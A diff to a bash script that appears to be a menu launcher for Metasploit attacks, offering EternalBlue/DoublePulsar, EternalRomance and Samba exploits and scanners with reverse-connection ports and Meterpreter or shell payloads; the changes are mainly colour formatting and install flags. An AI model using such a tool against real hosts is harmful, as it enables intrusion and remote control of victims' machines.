@@ -64,7 +64,9 @@ echo -e "$red"'            ###' "$yellow"'            Checking dependencies . . 
 echo -e "$red"'            #######################################################'
 echo
 apt-get install masscan -y
-dpkg --add-architecture i386 && apt-get update && apt-get install wine32
+dpkg --add-architecture i386 && apt-get update && apt-get install wine32 -y
+
+
 apt-get install metasploit-framework
 clear
 clear
@@ -78,7 +80,7 @@ fi
 # Check Files and Directory 
 checkfile(){
 cp -r deps/ $dir/
-cp -r eternalblue_doublepulsar.rb $dir/smb/
+cp -r eternalblue_doublepulsar.rb $dir/
 touch config.rc
 echo reload_all >> config.rc
 echo 'exit' >> config.rc
@@ -120,10 +122,10 @@ logo
 echo
 echo '     Exploits'
 echo
-echo '     1 MS17-010 EXPLOIT'
-echo '     2 SAMBA EXPLOIT'
+echo -e '     '"$red"'['"$white"'1'"$red"']'"$white"' MS17-010 EXPLOIT'
+echo -e '     '"$red"'['"$white"'2'"$red"']'"$white"' SAMBA EXPLOIT'
 echo
-echo '     0 Exit'
+echo -e '     '"$red"'['"$white"'0'"$red"']'"$white"' Exit'
 echo -e "$yellow"
 read -p '     Please select exploit: ' opts
 if [[ $opts -eq 1 ]] 
@@ -133,14 +135,14 @@ logo
 echo -e "$white"
 echo '     Enternal Exploits/Scanner'
 echo
-echo '     1   Eternalblue Doublepulsar Exploit'
-echo '     2   EternalBlue SMB Remote Windows Kernel Pool Corruption Exploit'
-echo '     3   EternalRomance/Synergy/Champion Remote Code Execution Exploit'
-echo '     4   Nmap MS17-010 Eternalblue Scanner'
-echo '     5   MS17-010 Eternalblue Scanner'
-echo '     6   EternalRomance/Synergy/Champion Remote Code Execution Scanner'
+echo -e '     '"$red"'['"$white"'1'"$red"']'"$white"'   Eternalblue Doublepulsar Exploit'
+echo -e '     '"$red"'['"$white"'2'"$red"']'"$white"'   EternalBlue SMB Remote Windows Kernel Pool Corruption Exploit'
+echo -e '     '"$red"'['"$white"'3'"$red"']'"$white"'   EternalRomance/Synergy/Champion Remote Code Execution Exploit'
+echo -e '     '"$red"'['"$white"'4'"$red"']'"$white"'   Nmap MS17-010 Eternalblue Scanner'
+echo -e '     '"$red"'['"$white"'5'"$red"']'"$white"'   MS17-010 Eternalblue Scanner'
+echo -e '     '"$red"'['"$white"'6'"$red"']'"$white"'   EternalRomance/Synergy/Champion Remote Code Execution Scanner'
 echo
-echo '     0 Back'
+echo -e '     '"$red"'['"$white"'0'"$red"']'"$white"' Back'
 echo -e "$yellow"
 read -p '     Please select exploit: ' exploit
 if [[ $exploit -eq 1 ]]
@@ -180,15 +182,15 @@ read -p '     Port for reverse connection: ' port
 echo
 echo '     Enternal Blue Architecture'
 echo
-echo '     1 x86 Architecture'
-echo '     2 x64 Architecture'
+echo -e '     '"$red"'['"$white"'1'"$red"']'"$white"' x86 Architecture'
+echo -e '     '"$red"'['"$white"'2'"$red"']'"$white"' x64 Architecture'
 echo 
 read -p '     Please select architecture: ' arch
 echo	
 echo '     Enternal Blue Payload'
 echo
-echo '     1 Meterpreter'
-echo '     2 Shell'
+echo -e '     '"$red"'['"$white"'1'"$red"']'"$white"' Meterpreter'
+echo -e '     '"$red"'['"$white"'2'"$red"']'"$white"' Shell'
 echo
 read -p '     Please select payload: ' cmd
 if [[ $cmd -eq 1 ]]
@@ -495,10 +497,10 @@ logo
 echo -e "$white"
 echo '     Samba Exploit'
 echo
-echo '     1 Samba exploit'
-echo '     2 Nmap samba scanner'
+echo -e '     '"$red"'['"$white"'1'"$red"']'"$white"' Samba exploit'
+echo -e '     '"$red"'['"$white"'2'"$red"']'"$white"' Nmap samba scanner'
 echo
-echo '     0 Back'
+echo -e '     '"$red"'['"$white"'0'"$red"']'"$white"' Back'
 echo
 echo -e "$yellow"
 read -p '     Please select exploit: ' exploit
@@ -565,3 +567,4 @@ fi
 else
 checkfile
 fi
+
